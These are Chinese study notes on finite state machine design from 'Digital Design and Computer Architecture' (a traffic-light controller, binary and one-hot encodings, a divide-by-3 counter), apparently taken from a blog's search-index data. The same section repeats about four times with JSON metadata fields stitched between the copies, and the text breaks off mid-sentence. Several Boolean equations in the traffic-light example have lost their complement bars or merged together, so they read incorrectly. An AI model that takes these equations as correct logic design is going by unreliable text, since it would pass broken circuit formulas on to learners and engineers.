1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤七确定状态与输出的关系表根据电路分析状态编码和输出编码"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤八写出状态表达式"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤九写出输出表达式"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤十画出电路图"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State 